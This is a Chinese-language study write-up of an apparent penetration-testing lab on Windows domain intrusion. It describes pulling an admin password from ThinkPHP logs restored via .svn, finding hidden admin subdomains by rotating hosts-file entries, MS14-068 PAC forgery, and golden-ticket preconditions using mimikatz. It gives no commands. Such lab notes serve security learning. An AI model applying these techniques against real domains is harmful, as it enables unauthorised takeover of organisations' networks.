初探内网域渗透

总结

通过暗月六的项目，了解了域内的基本知识，掌握了mimikatz工具的基本使用，学习了 Kerberos 的简单攻击（包括 PAC 攻击和黄金票据的生成上传），同时也接触了 Metasploit 的更多模块，最后还尝试了使用 CS 进行域渗透。

发现日志文件，thinkphp 低版本在会记录修改密码的日志，所以可以找到管理员的密码。

本来以为已经找到了密码，解一下是 123456，但是看完视频才发现通过 .svn 恢复的日志文件不全，存在更新的。学习暗月佬写了一个脚本来收集相关的日志记录，找到了最新的密码记录。

学习一下绑定 hosts 碰后台的技巧。为了安全起见，目标会在自己的服务器的 hosts 上绑定一个后台的子域名，而非在公网上申请一个后台的子域名，这样只有他自己的服务器能够访问，而攻击者不能访问到。但是当我们不断修改攻击机上的 hosts 文件，只要能够成功找到目标 IP，那么就实现了子域名的碰撞。

内网域渗透

发现域环境，一般域控和 dns 都在同一个服务器上。

发现 445 端口，尝试永恒之蓝，但是无法攻击成功。

PAC 是用来验证 Client 的访问权限的，它会被放在 TGT 里发送给 Client，然后由 Client 发送给 TGS。MS14-068 是密钥分发中心（KDC）服务中的漏洞。它允许经过身份验证的用户在其 Kerberos 票证（TGT）中插入任意的 PAC（表示所有用户权限的结构）。普通用户可以通过呈现具有改变了 PAC 的 Kerberos TGT 来获得票证，进而伪造票据获得管理员权限。

主要满足三个条件：

  • 域控没有打 MS14-068 的补丁(KB3011780)
  • 拿下一台加入域的计算机
  • 有这台域内计算机的域用户密码和 SID

在这里，存在主机为 web，存在域普通用户为 web，web 主机的系统管理员为 administrator，两者的密码可能相等。

GitHub - ParrotSec/mimikatz

最终成功访问到了域控。

接下来就是拿到域控的 shell。

学习一下黄金票据的利用。在 Windows 的 kerberos 认证过程中，Client 将自己的信息发送给 KDC，然后 KDC 使用 krbtgt 用户的 Hash 作为密钥进行加密，生成 TGT 。那么如果获取到了 krbtgt 的 Hash 值，不就可以伪造任意的 TGT 了吗。因为 krbtgt 只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限，黄金凭据可以理解为一个后门。

主要满足以下条件：

  • krbtgt 的 NTLM Hash
  • 完整的域名和域SID
  • 需要伪造的域管理员用户名
